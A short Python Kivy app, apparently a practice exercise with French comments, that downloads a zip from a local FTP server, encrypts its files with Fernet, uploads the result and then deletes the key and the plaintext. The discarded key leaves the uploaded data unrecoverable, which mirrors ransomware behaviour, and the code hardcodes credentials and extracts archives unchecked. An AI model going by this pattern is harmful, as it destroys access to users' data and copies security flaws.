from kivy.app import App
from kivy.uix.button import Button
from ftplib import FTP
from zipfile import ZipFile
import os
from cryptography.fernet import Fernet

def handle_click(self):
    # connexion au serveur ftp
    ftp = FTP('127.0.0.1' )  
    ftp.login("user", "pass")
    ftp.cwd('/server')

    # copie temporaire du zip sur le serveur ftp  (temp_server_file.zip)
    with open("temp_server_file.zip", "wb") as file:
        ftp.retrbinary("RETR fichier.zip", file.write)
    
    # dezip le fichier temporaire sur le serveur
    with ZipFile("temp_server_file.zip", 'r') as zip_content:
        file_list = zip_content.extractall()
    
    # genere une cle et la stock dans le fichier key.key
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    fernet = Fernet(key)

    os.mkdir("encrypted") # ceation du dossier hebergeant les fichier enctyptes

    # encrypte le contenu de tout le dossier /fichier
    for file in os.listdir('fichier'):
        with open('fichier/' + file, "rb") as f:
            file_data = f.read() # recupere le contenu
            encrypted_data = fernet.encrypt(file_data) # enctypte le contenu
            with open('encrypted/' + file, "wb") as f:
                f.write(encrypted_data) # reecrit le contenu

    # zip le dossier encrypte
    zip = ZipFile('encrypted_folder.zip', 'w')
    for root, dirs, files in os.walk("encrypted"):
        for file in files:  
            zip.write(os.path.join(root, file))
    zip.close()

    # renvoie au serveur ftp le zip enctypte
    with open('encrypted_folder.zip', 'rb') as fp:
	    ftp.storbinary('STOR encrypted_data.zip', fp)

    # supprime toutes les donnees temporaires
    for file in os.listdir('encrypted'):
        os.remove('encrypted/' + file)
    os.rmdir('encrypted')

    for file in os.listdir('fichier'):
        os.remove('fichier/' + file)
    os.rmdir('fichier')

    os.remove('key.key')
    os.remove('temp_server_file.zip')
    os.remove('encrypted_folder.zip')

    ftp.quit()

# ui lanceant le programme
class MonApplication(App):
    def build(self):
        bouton = Button(text='Encypter le fichier zip')
        bouton.bind(on_release=handle_click)
        return bouton

MonApplication().run()

